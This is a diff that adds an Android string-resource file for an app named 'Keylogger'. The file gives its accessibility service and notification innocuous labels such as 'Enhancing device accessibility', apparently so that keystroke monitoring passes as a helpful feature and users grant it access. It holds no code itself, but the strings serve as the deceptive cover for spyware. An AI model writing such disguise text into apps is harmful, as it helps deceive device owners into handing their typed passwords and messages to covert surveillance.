@@ -1,0 +1,6 @@
+<resources>
+    <string name="app_name">Keylogger</string>
+    <string name="accessibility_service_description">This service enhances device accessibility by monitoring user interactions.</string>
+    <string name="notification_title">Accessibility Services</string>
+    <string name="notification_text">Enhancing device accessibility</string>
+</resources>
